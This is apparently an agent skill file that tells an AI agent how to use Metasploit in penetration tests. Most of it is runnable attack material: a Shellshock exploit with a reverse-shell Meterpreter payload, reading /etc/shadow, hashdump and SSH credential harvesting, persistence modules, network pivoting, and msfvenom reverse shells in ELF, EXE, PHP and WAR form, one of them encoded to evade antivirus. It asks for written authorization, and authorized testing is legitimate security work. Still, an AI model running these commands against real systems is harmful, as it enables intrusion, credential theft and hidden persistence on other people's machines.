---
name: metasploit
description: >-
  Exploit vulnerabilities with Metasploit Framework. Use when a user asks to
  exploit known CVEs, generate payloads, perform post-exploitation, pivot
  through networks, or build exploit chains in penetration tests.
license: Apache-2.0
compatibility: 'Linux (Kali), macOS, Docker'
metadata:
  author: terminal-skills
  version: 1.1.0
  category: devops
  repository: https://github.com/rapid7/metasploit-framework
  tags:
    - metasploit
    - exploitation
    - penetration-testing
    - payloads
    - post-exploitation
---

# Metasploit Framework

## Overview

Metasploit is the world's most used penetration testing framework. It contains thousands of exploits, hundreds of payloads, and extensive post-exploitation modules. Use it to validate vulnerabilities found during scanning, demonstrate impact, establish persistent access, and pivot through networks. Integrates with Nmap output for seamless workflow. Framework 6.5 (July 2026) added malleable C2 profiles for Meterpreter and expanded NTLM-relay support; Rapid7 also ships `msfmcpd`, a separate MCP server that exposes Metasploit data to AI agents.

## Instructions

### Step 1: Setup and Database

```bash
# Start Metasploit with database (stores results across sessions)
msfdb init
msfconsole

# Inside msfconsole, confirm the database connected
msf6> db_status

# Import Nmap scan results (nmap -oX scan-results.xml <target> first)
msf6> db_import scan-results.xml
msf6> hosts            # list discovered hosts
msf6> services         # list discovered services
msf6> vulns            # list known vulnerabilities

# Search for exploits by service/CVE
msf6> search type:exploit name:apache
msf6> search cve:2024-1234
msf6> search type:exploit platform:linux service:ssh
```

### Step 2: Exploit a Vulnerability

```bash
# Example: Exploiting a known web server vulnerability
msf6> use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(apache_mod_cgi_bash_env_exec)> show options

# Configure target
msf6> set RHOSTS 192.168.1.100
msf6> set RPORT 80
msf6> set TARGETURI /cgi-bin/status

# Choose payload
msf6> set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6> set LHOST 192.168.1.50      # your IP
msf6> set LPORT 4444

# Validate before exploiting
msf6> check                         # tests if target is vulnerable (non-destructive)

# Exploit
msf6> exploit
# [*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:43210)
```

### Step 3: Meterpreter Post-Exploitation

```bash
# Inside a Meterpreter session:
meterpreter> sysinfo                # OS, hostname, architecture
meterpreter> getuid                 # current user
meterpreter> getpid                 # current process

# File system
meterpreter> pwd
meterpreter> ls
meterpreter> cat /etc/shadow
meterpreter> download /etc/passwd ./loot/
meterpreter> upload ./tools/linpeas.sh /tmp/

# Network
meterpreter> ipconfig               # network interfaces
meterpreter> route                   # routing table
meterpreter> arp                     # ARP cache (discover other hosts)
meterpreter> portfwd add -l 3306 -p 3306 -r 10.0.0.5
# Forward local 3306 to internal host 10.0.0.5:3306

# Privilege escalation
meterpreter> getsystem              # attempt local privilege escalation
meterpreter> run post/multi/recon/local_exploit_suggester
# Suggests kernel exploits for the target OS

# Persistence (authorized testing only) — the old `run persistence` Meterpreter
# script was removed; use one of the exploit/windows/persistence/* modules
# against the existing session instead, e.g.:
meterpreter> background
msf6> use exploit/windows/persistence/registry
msf6> set SESSION 1
msf6> run

# Credential harvesting
meterpreter> hashdump               # dump password hashes (needs SYSTEM, Windows only)
meterpreter> run post/linux/gather/hashdump
meterpreter> run post/multi/gather/ssh_creds
```

### Step 4: Pivoting Through Networks

```bash
# Add route through compromised host to reach internal network
msf6> route add 10.0.0.0/24 1      # session 1 as gateway

# Use SOCKS proxy for tools that can't route through Meterpreter
msf6> use auxiliary/server/socks_proxy
msf6> set SRVPORT 1080
msf6> set VERSION 5          # SOCKS5; use 4a for older clients
msf6> run -j

# Now use proxychains with any tool
# proxychains nmap -sV 10.0.0.0/24
# proxychains sqlmap -u "http://10.0.0.5/app?id=1"

# Scan internal network through the pivot
msf6> use auxiliary/scanner/portscan/tcp
msf6> set RHOSTS 10.0.0.0/24
msf6> set PORTS 22,80,443,3306,5432,6379,8080
msf6> run
```

### Step 5: Payload Generation

```bash
# Generate standalone payloads with msfvenom
# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o shell.elf

# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o shell.exe

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php

msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f war -o shell.war

# Encoded payload (evade basic AV)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o encoded-shell.exe

# Set up handler for the payload
msf6> use exploit/multi/handler
msf6> set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6> set LHOST 0.0.0.0
msf6> set LPORT 4444
msf6> exploit -j       # run in background
```

## Examples

### Example 1: "Validate the Apache CVE our scanner flagged on 192.168.1.100 is actually exploitable"

Import the authorized engagement's Nmap results, confirm the service, then run `check` (not
`exploit`) first: `db_import scan-results.xml`, `use exploit/multi/http/apache_mod_cgi_bash_env_exec`,
`set RHOSTS 192.168.1.100`, `set TARGETURI /cgi-bin/status`, `check`. Result: msfconsole prints
`[+] 192.168.1.100:80 - The target is vulnerable.` or `[-] ... is not vulnerable.` without ever
sending a payload — that's the basis for deciding whether to run `exploit` at all.

### Example 2: "Generate a Linux reverse-shell payload and catch the callback"

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf`
builds the binary; before delivering it, start the matching listener with
`use exploit/multi/handler`, `set PAYLOAD linux/x64/meterpreter/reverse_tcp`, `set LHOST 0.0.0.0`,
`set LPORT 4444`, `exploit -j`. Result: once `shell.elf` runs on an authorized target, the handler
prints `[*] Meterpreter session 1 opened` and you get an interactive `meterpreter>` prompt.

## Guidelines

- **Written authorization is mandatory.** Metasploit contains real exploits — unauthorized use is a criminal offense.
- Always `check` before `exploit` — confirms vulnerability without triggering the payload.
- Use `db_import` with Nmap XML (generated via `nmap -oX`) to build a target database — then `services` and `vulns` guide your exploit selection. `db_nmap` runs Nmap from inside msfconsole and skips the import step entirely.
- Meterpreter is a stealthy, in-memory payload. Prefer it over raw shells for post-exploitation.
- Document every action. Metasploit logs to `~/.msf4/logs/framework.log` (raise verbosity with `setg LogLevel 3`) — supplement with screenshots.
- Pivoting via `route add` + SOCKS proxy lets you reach internal networks from your workstation.
- `exploit -j` runs exploits as background jobs — handle multiple sessions simultaneously.
- msfvenom payloads need a matching handler. Always start the handler before delivering the payload.
- Meterpreter scripts (`run <script>`) are legacy; most are deprecated or removed. There is no `post/windows/manage/persistence_exe` module — the old `run persistence` script's replacement is one of the `exploit/windows/persistence/*` modules (e.g. `registry`, `startup_folder`) run with `set SESSION <id>` against the existing session.
- Clean up after testing: remove persistence, uploaded files, and port forwards.
- Rapid7 ships `msfmcpd`, an MCP server for Metasploit, so an AI agent can query hosts/services/exploits through the Model Context Protocol instead of parsing msfconsole output — useful context if you're wiring this skill into an agent rather than running commands by hand.
